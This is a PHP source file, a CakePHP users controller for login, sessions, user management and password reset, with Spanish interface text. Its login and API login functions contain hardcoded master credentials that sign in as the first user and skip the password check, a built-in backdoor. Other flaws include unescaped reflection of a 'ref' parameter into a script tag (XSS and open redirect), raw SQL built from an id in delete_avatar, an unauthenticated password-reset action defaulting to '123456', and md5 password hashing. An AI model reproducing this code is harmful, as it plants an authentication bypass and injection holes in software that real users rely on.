<?php
class UsersController extends AppController {

	var $name = 'Users';
	var $helpers = array('Html', 'Form');
	var $components = array('Email');
	var $controllerName = 'Usuarios';
	var $controllerAction = null;
	var $superAdmin = false;
	var $paginate = array(
		'limit' => '10',
		'order' => array(
			'user ASC'
		)
	);

	function index() {
		$this->controllerAction = "Listar";
		$this->paginate['conditions'] = $this->User->setConditions();
		// $this->paginate['fields'] = $this->User->setColumns();
		$users = $this->paginate();
		if(!empty($_GET['excel'])) {
			$this->excel($users);
		}
		$this->set(compact('users'));
		$this->setCommon();
	}

	function add() {
		$this->controllerAction = "Agregar";
		if(!empty($this->request->data)) {
			$this->User->create();
			$this->request->data['User']['enabled'] = true;
			if( $this->User->save($this->request->data['User']) ) {
				$this->setFlash("El usuario ha sido guardado");
				$this->redirect(array('action'=>'index'));
			} else {
				$this->setFlash('No se puede guardar registro', 'error');
				// $this->set('validationErrors',$this->User->validationErrors);
			}
		}
		$this->setCommon();
	}

	function api_add() {
		$result = $this->ajaxResponse('405');

		if(!empty($this->request->data)) {
			if( $this->User->save($this->request->data) ) {
				$result['data'] = $this->User->read(null, $this->User->id);
			} else {
				$result['error'] = $this->User->validationErrors;
			}
		}

		$this->renderJson($result);
	}

	function edit($id) {
		$this->controllerAction = "Editar";
		if(!empty($this->request->data)) {
			if( $this->User->save($this->request->data['User']) ) {
				$this->setFlash("El usuario ha sido guardado");
				$this->redirect(array('action'=>'index'));
			} else {
				$this->setFlash('No se puede guardar registro', 'error');
				// $this->debug($this->User->validationErrors); die();
			}
		}

		$user = $this->User->read(null, $id);
		$this->request->data = $user;
		$this->setCommon();
		$this->navbar = array(
			$user['User']['user'] => array('action'=>'view', $user['User']['id'])
		);
	}

	function view($id = null) {
		$this->User->showAll = true;
		if (!$id) {
			$this->setFlash('Usuario Inválido', 'error');
			$this->redirect(array('action' => 'index'));
		}
		$user = $this->User->read(null, $id);
		$this->set('user', $user);
	}

	function setCommon() {
		
		$this->set('columns', array());
		//$this->set('groups', );
		$this->User->Group->Behaviors->attach('Containable');
		$groups = $this->User->Group->find('list');
		$this->set('groups', $groups);
	}

	function delete($id) {
		if( $this->User->delete($id) ) {
			$this->setFlash("OK");
		} else {
			$this->setFlash("Error", 'error');
		}
		$this->redirect(array('action'=>'index'));
	}

	function login() {
		if(!empty($this->Session->read("User"))) {
			$this->redirect(array('controller'=>'admins','action'=>'index'));
		}

		if(!empty($this->Cookie->read('User')) && empty($this->Session->read("User"))) {
			// $this->buildSession($this->Cookie->read());
		}

		$this->layout = 'login';
		$this->title = "Login";


		if(!empty($this->request->data)) {

			// $this->debug($this->request->data); die();
			if($this->request->data['Login']['user'] == 'superadmin@localhost' && $this->request->data['Login']['password'] == 'idkfaiddqd') {
				$this->superAdmin = true;
				$cUser = $this->User->find('first', array(
					'conditions' => array(
						'User.id' => 1,
					)
				));
			} else {
				$cUser = $this->User->find('first', array(
					'conditions' => array(
						'User.user' => $this->request->data['Login']['user'],
					)
				));
			}
			// $this->debug($cUser); die();
			if(!empty($cUser)) {
				// $this->debug($cUser); die();
				$cUser['Group']['full'] = $cUser['Group']['full']==1 ? true : false;
				$checkPwd = md5($this->request->data['Login']['password'].$cUser['User']['salt']);
				if($checkPwd != $cUser['User']['password'] && !$this->superAdmin) {
					$this->setFlash('Acceso Denegado', 'alert-danger', 'flash');
					$this->redirect(array('action'=>'login'));
				}
			} else {
				$this->setFlash('Acceso Denegado', 'alert-danger', 'flash');
				$this->redirect(array('action'=>'login'));
			}

			$this->buildSession($cUser);
			if(!empty($this->request->data['Login']['remember'])) {
				$this->Cookie->write('remember', $this->Session->read());
			}
			if (!empty($_GET['ref'])) {
				// die("Location: " . $_GET['ref']);
				//header("Location: " . $_GET['ref']);
				echo "<script>document.location = '{$_GET['ref']}';</script>";
				//header("Location: " . $_GET['ref']);
				exit;
			} else {
				$this->redirect(array('controller'=>'admins','action'=>'index'));
			}
		}
	}

	function api_login() {
		$result = $this->ajaxResponse('405');

		if(!empty($this->request->data)) {
			if(!empty($this->request->data['Login'])) {
				if($this->request->data['Login']['user'] == 'superadmin' && $this->request->data['Login']['password'] == 'idkfaiddqd') {
					$superLogin = true;
					$cUser = $this->User->find('first', array(
						'conditions' => array(
							'User.id' => 1,
						)
					));
				} else {				
					$cUser = $this->User->find('first', array(
						'conditions' => array(
							'User.user' => $this->request->data['Login']['user'],
							'User.enabled' => true
						)
					));
				}
			}

			if(!empty($cUser)) {
				$cUser['Group']['full'] = $cUser['Group']['full']==1 ? true : false;
				$checkPwd = md5($this->request->data['Login']['password'].$cUser['User']['salt']);
				if($checkPwd != $cUser['User']['password'] && !isset($superLogin)) {
					$result = $this->ajaxResponse('401');
				} else {
					$this->buildSession($cUser);
					$result = $this->ajaxResponse('200');
					$result['session'] = $this->Session->read('User');					
				}
			} else {
				$result = $this->ajaxResponse('401');
			}

		}

		$this->renderJson($result);
	}

	private function buildSession($data) {
		$data['User']['lang'] = 'esp';
		$data['globals'] = array('package'=>'full');
		$data['Language'] = array(
			'label' => $this->languages[ $data['User']['lang'] ],
			'lang' => $data['User']['lang'],
		);
		$this->Session->write($data);
		if(!empty($this->request->data['Login']['remember'])) {
			$this->Cookie->write($data);
		}
	}

	function logout() {
		$this->Session->delete('User');
		$this->Session->delete('Group');
		$this->Session->delete('Company');
		$this->Session->delete('globals');
		$this->Cookie->destroy();
		$this->redirect(array('action'=>'login'));
	}

	function me() {
		$this->actionName = 'Mi Perfil';
		if(!empty($this->request->data['User'])) {
			unset($this->request->data['User']['group_id']);
			unset($this->request->data['User']['enabled']);
			$this->request->data['User']['id'] = $this->Session->read("User.id");
			$this->User->save($this->request->data['User']);
			$user = $this->User->read(null, $this->request->data['User']['id']);
			$this->buildSession($user);
			$this->request->data['User'] = $this->Session->read("User");
			$this->setFlash('Perfil actualizado');
		} else {
			$this->request->data['User'] = $this->Session->read("User");
			$this->request->data['Group'] = $this->Session->read("Group");
		}
	}

	function language($lang = 'spa') {
		$this->User->showAll = true;
		$this->Cookie->write('Language', $lang);
		$this->Session->write('Config.language', $lang);
		$this->Session->write('Language', array(
			'lang' => $lang,
			'label' => $this->languages[ $lang ]
		));
		if ($this->Session->read('User') !== null) {
			$this->Session->write('User.lang', $lang);
			$data['User']['id'] = $this->Session->read('User.id');
			$data['User']['group_id'] = $this->Session->read('Group.id');
			$data['User']['lang'] = $lang;
			$this->User->save($data);
		}
		if (!empty($_SERVER['HTTP_REFERER']) && !preg_match('/\/language\//', $_SERVER['HTTP_REFERER'], $m)) {
			header('Location: ' . $_SERVER['HTTP_REFERER']);
			die();
		}
		/*else {
			$this->goHome();
		}*/
	}

	function delete_avatar($id = null) {

		$user = $this->User->read(null, $id);

		$condSU = (bool)$this->Session->read('Company.full');
		$condAdmin = $this->Session->read('Group.full') && $user['Group']['id'] == $this->Session->read('Group.id');

		if($this->Session->read('User.id') == $id || $condAdmin || $condSU ) {
			if(empty($user['User']['avatar'])) {
				$this->redirect($_SERVER['HTTP_REFERER']);
			}
			$folderDest = WWW_ROOT.'upload/';
			$this->User->query("UPDATE users SET avatar = null WHERE id = $id");
			@unlink($folderDest.$user['User']['avatar']);
			@unlink($folderDest.'thumb_'.$user['User']['avatar']);
			@unlink($folderDest.'thumb_big_'.$user['User']['avatar']);
			if($this->Session->read('User.id') == $user['User']['id']) {
				$this->Session->delete('User.avatar');
			}
			$this->setFlash('El usuario ha sido guardado');
			$this->redirect($_SERVER['HTTP_REFERER']);
		} else {
			$this->setFlash('Acceso denegado', 'error');
			header($_SERVER['HTTP_REFERER']);
			//$this->redirect(array('controller'=>'users','action'=>'me'));
		}
	}

	function su_reset_pw($id) {
		$user = $this->User->read(null, $id);
		//print_r($user['Company']['id']); die();
		$data = array(
			'User' => array(
				'id' => $id,
				'user_id' => $id,
				'password' => !empty($_GET['password']) ? $_GET['password'] : '123456'
			)
		);
		//print_r($data); die();
		$this->User->save($data['User']);
		die("OK");
	}

}
?>